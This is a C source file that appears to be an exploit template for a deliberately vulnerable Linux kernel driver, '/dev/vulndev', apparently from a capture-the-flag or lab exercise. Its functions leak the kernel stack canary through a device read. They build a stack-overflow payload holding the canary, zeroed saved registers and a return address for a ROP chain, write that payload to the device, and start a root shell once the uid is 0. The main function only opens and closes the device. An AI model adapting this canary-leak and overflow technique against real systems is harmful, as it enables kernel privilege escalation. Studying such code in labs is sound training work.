#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h> 
#include <fcntl.h>
#include <errno.h>
#include "xpl_utils.h"

/* Configuration */
#define DEVICE_PATH     "/dev/vulndev"

/* IOCTL Codes */
#define VULN_IOCTL_READ  _IOR(0x1337, 1, char *)
#define VULN_IOCTL_WRITE _IOW(0x1337, 2, char *)
#define VULN_IOCTL_EXEC  _IO(0x1337, 3)

int			open_dev(const char *path, int flags);
uintptr_t	leak_cookie(int fd, size_t leak_slots, size_t cookie_offset);
void		stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
                    		size_t cookie_offset, size_t pl_len);
void		spawn_shell(void);

int main(void)
{
    int fd = open_dev(DEVICE_PATH, O_RDWR);


    close(fd);
    printf("[+] Done\n");
    return 0;
}

/* Open file stream for a device/module */
int open_dev(const char *path, int flags) 
{
    int fd = open(path, flags);
    if (fd < 0) {
        FAILURE("Failed to open %s: %s", path, strerror(errno));
        DIE("open_dev");
    }

    SUCCESS("Opened device: %s (fd=%d)", path, fd);
    return fd;
}

/* Leak kernel stack cookie */
uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
{
    uintptr_t *leaks = calloc(leak_slots, sizeof(uintptr_t));
    if (!leaks)
        DIE("calloc");

    ssize_t nread = read(fd, leaks, leak_slots * sizeof(uintptr_t));
    if (nread < 0)
        DIE("read");

    uintptr_t cookie = leaks[cookie_offset / sizeof(uintptr_t)];
    printf("[*] Cookie: 0x%lx\n", (unsigned long)cookie);

    free(leaks);
    return cookie;
}

/* Kernel stack overflow */
void stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
                    size_t cookie_offset, size_t pl_len)
{
    size_t pl_slots = pl_len / sizeof(uintptr_t);

    uintptr_t *pl = calloc(pl_slots, sizeof(uintptr_t));
    if (!pl)
        DIE("calloc");

    size_t pos = cookie_offset / sizeof(uintptr_t);
    if (pos + 4 >= pl_slots) {
		FAILURE(
			"Payload length (%zu bytes) is too small: need at least %zu bytes to reach return address\n",
            pl_len,
            cookie_offset + 5 * sizeof(uintptr_t)
		);
        free(pl);
		DIE("payload");
    }

    pl[pos++] = cookie;     // Canary
    pl[pos++] = 0x0;        // rbx
    pl[pos++] = 0x0;        // r12
    pl[pos++] = 0x0;        // saved rbp
    pl[pos++] = ret_addr;   // ret addr (e.g. ROP)

    hexdump("[*] Payload", pl, pl_len);

    ssize_t written = write(fd, pl, pl_len);
    if (written < 0)
        DIE("write");

    printf("[!] %zd bytes of payload written\n", written);
    free(pl);
}

/* Rooted */
void spawn_shell(void) {
    if (getuid() == 0) {
        printf("[+] GOT ROOT SHELL!\n");
        system("/bin/sh");
    } else {
        fprintf(stderr, "[-] Failed to escalate\n");
        exit(1);
    }
}


